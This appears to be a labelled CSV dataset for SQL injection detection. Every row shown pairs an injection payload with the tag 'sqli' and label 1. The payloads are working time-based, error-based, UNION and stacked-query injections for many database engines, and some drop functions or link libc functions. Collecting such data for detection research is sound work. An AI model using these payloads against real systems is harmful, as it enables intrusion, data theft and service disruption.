payload,attack_type,label
"1' where 6963=6963 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
1'));select (case when (3365=6236) then 3365 else 1/(select 0) end)--,sqli,1
"1"") as mibc where 3113=3113;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1
1')) waitfor delay '0:0:5' and (('amnf' like 'amnf,sqli,1
"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1
"1' where 7504=7504 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('zaru'='zaru",sqli,1
"1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",sqli,1
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1
"1%"" or (select * from (select(sleep(5)))sddo)#",sqli,1
1) as bpap where 7758=7758 or 4240=(select 4240 from pg_sleep(5))--,sqli,1
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('dzzx'='dzzx",sqli,1
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",sqli,1
1'+(select soqk where 5383=5383;select pg_sleep(5)--,sqli,1
"1%"") and make_set(8403=8403,8899) and (""%""=""",sqli,1
1'));select pg_sleep(5)--,sqli,1
"1%') union all select null,null,null,null#",sqli,1
"1"")) as xcyo where 2929=2929;select sleep(5)--",sqli,1
-9564 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1
"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (4959=4959",sqli,1
1'+(select 'ohdf' where 7878=7878 and 5678=3277--,sqli,1
"1;select count(*) from generate_series(1,5000000)# fnck",sqli,1
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1
1))) and 6467=1864#,sqli,1
"1%"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1"") as nqtn where 5606=5606 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
1%')) order by 1--,sqli,1
"1' where 8803=8803 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1"") as ffon where 2738=2738 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1
"1') as mara where 7164=7164;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1' where 7125=7125 or elt(6272=6272,sleep(5))--",sqli,1
"1')) and elt(4249=4249,7259) and (('miir' like 'miir",sqli,1
"1 where 1062=1062 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1"") union all select null,null,null,null,null,null,null#",sqli,1
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""ijop""=""ijop",sqli,1
1));(select * from (select(sleep(5)))srmq) and ((4982=4982,sqli,1
"-2241))) or make_set(9354=9354,7185) and (((6840=6840",sqli,1
"1' where 4417=4417 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""njdu"" like ""njdu",sqli,1
1)));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1
-7345) union all select 3866#,sqli,1
"-4287%"")) union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",sqli,1
"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",sqli,1
"-3037""))) or elt(4758=9129,9129) and (((""zewv"" like ""zewv",sqli,1
1'+(select bjav where 6923=6923 and (select * from (select(sleep(5)))gcrr)#,sqli,1
"1%"" and (select * from (select(sleep(5)))fzno) and ""%""=""",sqli,1
"-6381%"" or 8571=8571--",sqli,1
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('beju' like 'beju",sqli,1
1';begin user_lock.sleep(5); end,sqli,1
1%') and sleep(5)#,sqli,1
-8521'+(select ucim where 9003=9003 union all select 9003--,sqli,1
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dqis""=""dqis",sqli,1
-5147 or (8459=8459)*4906,sqli,1
"1"")) as gvpm where 5170=5170 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
-8378%') union all select 5491#,sqli,1
"-9718%"") union all select 9515,9515,9515#",sqli,1
1))) and 4595=4595#,sqli,1
"1%"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",sqli,1
"1))) union all select null,null,null,null,null,null,null,null#",sqli,1
"-6263"" union all select 8005,8005#",sqli,1
"1' in boolean mode);iif(5257=5257,1,1/0)",sqli,1
1;(select * from (select(sleep(5)))srmq),sqli,1
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)-- hlgt",sqli,1
"-6041')) or make_set(9835=1367,1367) and (('hxjf'='hxjf",sqli,1
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('dbsm'='dbsm",sqli,1
"1'+(select 'idmr' where 5029=5029 union all select null,null,null,null,null,null--",sqli,1
"1'+(select taga where 8036=8036;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1
"1' in boolean mode) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",sqli,1
"1""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""xtyt""=""xtyt",sqli,1
"1"")) as ndbk where 5042=5042 and 8594=(select 8594 from pg_sleep(5))--",sqli,1
1')));if(9431=6730) select 9431 else drop function xbkh--,sqli,1
1'||(select 'idna' from dual where 2683=2683 rlike (select (case when (3201=9748) then 1 else 0x28 end)))||',sqli,1
"-1050"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""orfo"" like ""orfo",sqli,1
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('ylql' like 'ylql",sqli,1
1'||(select 'oxas' from dual where 8284=8284 or sleep(5))||',sqli,1
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('owot'='owot",sqli,1
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""ikaf"" like ""ikaf",sqli,1
1%' or 6793=(select 6793 from pg_sleep(5)) and '%'=',sqli,1
"1))) union all select null,null--",sqli,1
"1%"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"1"");begin dbms_lock.sleep(5); end--",sqli,1
"-7371') union all select 4531,4531,4531#",sqli,1
1' and 8594=(select 8594 from pg_sleep(5))--,sqli,1
"1"")) as sqow where 8752=8752;select (case when (1726=4080) then 1726 else 1/(select 0) end)--",sqli,1
"1'||(select 'brsr' where 5458=5458;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",sqli,1
1')) as hpta where 5376=5376 waitfor delay '0:0:5'--,sqli,1
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gucd'='gucd",sqli,1
"-1993%"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",sqli,1
1%';select (case when (1407=2741) then 1407 else 1407*(select 1407 from mysql.db) end)#,sqli,1
"1%"")) or sleep(5) and ((""%""=""",sqli,1
"1) where 9010=9010 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pziy'='pziy,sqli,1
"-7409"")) union all select 3145,3145,3145--",sqli,1
-8301'))) or (5708=5268)*5268 and ((('hkha'='hkha,sqli,1
"1) as odqn where 3910=3910;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1
-6757'))) or 4524=3696,sqli,1
1)));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1
"1%"")) and 7533=7533 and ((""%""=""",sqli,1
"1"" waitfor delay '0:0:5'",sqli,1
"1 or 8466=benchmark(5000000,md5(0x694a4745))# irvm",sqli,1
1)) as mlpf where 7425=7425;select sleep(5)--,sqli,1
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('afdy' like 'afdy",sqli,1
"1)) or 8421=(select count(*) from generate_series(1,5000000)) and ((4277=4277",sqli,1
"1'))) and elt(9041=6421,6421) and ((('ixxg' like 'ixxg",sqli,1
"1) where 2720=2720 and elt(4249=4249,7259)--",sqli,1
"1%')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('%'='",sqli,1
"1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"1"";if(8812=7896) select 8812 else drop function xltk--",sqli,1
-9225) or (8258=2726)*2726 and (9900=9900,sqli,1
"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""urqg""=""urqg",sqli,1
"1""));(select * from (select(sleep(5)))acdk)#",sqli,1
"1' in boolean mode) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)#",sqli,1
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cgiu'='cgiu,sqli,1
"-2225' union all select 1545,1545,1545,1545#",sqli,1
1%')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'=',sqli,1
"1%' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",sqli,1
"1%"")) and 7358=6986--",sqli,1
"1"") where 2136=2136 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
-7452 where 2224=2224 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli,1
1' where 8469=8469;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('esal'='esal,sqli,1
"1%' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1)) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
1)) as xcsm where 9231=9231;select sleep(5)#,sqli,1
"1"") as kuuf where 6908=6908;if(7899=7899) select 7899 else drop function zbbp--",sqli,1
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",sqli,1
1') or (select * from (select(sleep(5)))ydpu),sqli,1
1');begin user_lock.sleep(5); end,sqli,1
"-9208%"")) or 8571=8571--",sqli,1
"1'||(select 'yzdz' where 5021=5021;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1
"1) as kaew where 2658=2658;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1
1;select (case when (5796=8326) then 5796 else 5796*(select 5796 from information_schema.character_sets) end)#,sqli,1
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ksxz""=""ksxz",sqli,1
"1"" and 7533=7533 and ""dqjp""=""dqjp",sqli,1
"1)) as queb where 2449=2449 union all select null,null#",sqli,1
-5585' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1
"1""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1%"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",sqli,1
"1)) as jrzr where 5194=5194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%"");select case when 9390=5752 then 1 else null end--",sqli,1
"1) where 7485=7485 and make_set(8403=8403,8899)--",sqli,1
1) as sglv where 7676=7676;begin dbms_lock.sleep(5); end--,sqli,1
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# sipo,sqli,1
"1%"" and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1) where 5615=5615 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1
"1'+(select pxsd where 2576=2576 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",sqli,1
"1""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1
1)));select pg_sleep(5) and (((9476=9476,sqli,1
"-7125"" or (8919=2275)*2275 and ""fbwo""=""fbwo",sqli,1
"1');select * from generate_series(7494,7494,case when (7494=7854) then 1 else 0 end) limit 1--",sqli,1
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('kqqf'='kqqf",sqli,1
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""vlev"" like ""vlev",sqli,1
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""sckh""=""sckh",sqli,1
"-4015"" where 2610=2610 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""vabm""=""vabm",sqli,1
"1%"") union all select null,null,null,null,null,null,null,null,null,null--",sqli,1
"-9507%"" union all select 3342,3342,3342,3342,3342#",sqli,1
"1"") as jaxh where 6318=6318 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('swua' like 'swua",sqli,1
"1' in boolean mode) or elt(6272=6272,sleep(5))#",sqli,1
"-1287"") as bbzg where 1475=1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",sqli,1
"1%"") or elt(6272=6272,sleep(5)) and (""%""=""",sqli,1
"1%'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('nbsf' like 'nbsf",sqli,1
-3422%') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',sqli,1
"1%'))) union all select null,null,null,null,null,null,null,null#",sqli,1
1'+(select yjyp where 9696=9696;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
1'||(select 'tvcy' where 5592=5592 order by 1#,sqli,1
"1) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1')) union all select null,null,null,null,null,null,null,null,null--",sqli,1
"1'||(select 'cfff' where 4994=4994;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",sqli,1
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('uqfs'='uqfs,sqli,1
"1"") where 2602=2602 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1
"1%"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""%""=""",sqli,1
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('dcys' like 'dcys",sqli,1
"1') where 2725=2725 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
"1'+(select 'uzaw' where 9900=9900 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",sqli,1
"-8588' union all select 2135,2135--",sqli,1
"-5840') or elt(1032=1032,3623)",sqli,1
1';select (case when (7990=7627) then 7990 else 1/(select 0) end)--,sqli,1
"1"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"-1956"") where 1448=1448 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1
"1) and 8407=(select count(*) from generate_series(1,5000000))",sqli,1
"1%"" and elt(5345=8751,8751) and ""%""=""",sqli,1
1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,sqli,1
"1))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1'||(select 'dbxr' where 4014=4014 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",sqli,1
"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1
"1)) as rpwt where 4103=4103 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"1""))) and sleep(5)#",sqli,1
"1,(select (case when (5726=5275) then 1 else 1/(select 0) end))",sqli,1
"1"" and 7533=7533 and ""btak"" like ""btak",sqli,1
1')) as dago where 9788=9788;select (case when (6652=1932) then 6652 else 6652*(select 6652 from information_schema.character_sets) end)#,sqli,1
"1'||(select 'scwx' where 6591=6591 and 3824=benchmark(5000000,md5(0x76555642)))||'",sqli,1
1') and (1414=4775)*4775 and ('mlmw'='mlmw,sqli,1
-7548 or 2850=9666,sqli,1
1'));waitfor delay '0:0:5' and (('uvlf'='uvlf,sqli,1
"1"") union all select null#",sqli,1
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('vjdk' like 'vjdk",sqli,1
-5615') where 5931=5931 or 8450=9229,sqli,1
1' and 4374=2305,sqli,1
1) as iqkf where 7780=7780;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1
"1') where 5871=5871;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1
"1') where 9226=9226 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1) as ihan where 5298=5298 and elt(6587=3479,3479)--",sqli,1
1')) and 7533=7533 and (('gvoh'='gvoh,sqli,1
1') rlike sleep(5),sqli,1
1;select (case when (2768=8868) then 2768 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
"-4964"")) union all select 4750,4750,4750,4750,4750--",sqli,1
1')) as yqcl where 5026=5026 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'drui' like 'drui",sqli,1
"1"") as pwvu where 8267=8267;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1
"1) union all select null,null,null,null,null,null,null,null,null#",sqli,1
1'));select (case when (7385=8723) then 7385 else 7385*(select 7385 from information_schema.character_sets) end)#,sqli,1
"-2382%') union all select 8885,8885,8885,8885,8885,8885,8885#",sqli,1
"1%""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""%""=""",sqli,1
-4768'||(select 'dded' from dual where 6499=6499 union all select 6499--,sqli,1
1')) and 9198=9198--,sqli,1
"-2857%'))) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",sqli,1
"(updatexml(8862,concat(0x2e,0x7171706a71,(select (elt(8862=8862,1))),0x717a767a71),8981))",sqli,1
"1%"") union all select null,null,null,null,null,null,null#",sqli,1
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('pwpc'='pwpc",sqli,1
"1%""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""%""=""",sqli,1
"1 and make_set(9681=4703,4703)# zbrf",sqli,1
"1"" where 9332=9332 union all select null,null,null,null,null,null,null,null,null--",sqli,1
"1"") union all select null,null,null,null,null,null#",sqli,1
"-5013'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('ehwh' like 'ehwh",sqli,1
"1'+(select bruk where 1400=1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'",sqli,1
"1"" where 6352=6352;begin dbms_lock.sleep(5); end--",sqli,1
"1' where 6409=6409;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('mymg'='mymg",sqli,1
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""=""",sqli,1
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('boud'='boud",sqli,1
"-3862')) union all select 2495,2495,2495,2495,2495,2495,2495--",sqli,1
"1)) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((8294=8294",sqli,1
1)));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""jfgk"" like ""jfgk",sqli,1
-9202' where 9799=9799 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1
"1') or elt(6272=6272,sleep(5)) and ('xwsb'='xwsb",sqli,1
"1) as jqbv where 8172=8172 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1) as estm where 4809=4809 union all select null,null,null--",sqli,1
"1' in boolean mode) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",sqli,1
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq",sqli,1
"-2048)) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",sqli,1
-8409)) as ipbz where 9984=9984 or 3371=3869,sqli,1
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('gxgi'='gxgi",sqli,1
"1"");waitfor delay '0:0:5' and (""ludp"" like ""ludp",sqli,1
"1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""staz"" like ""staz",sqli,1
"1%"")));select (case when (5464=9350) then 5464 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1
"1"") as ymsc where 3694=3694 waitfor delay '0:0:5'--",sqli,1
"1"" where 7045=7045;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1
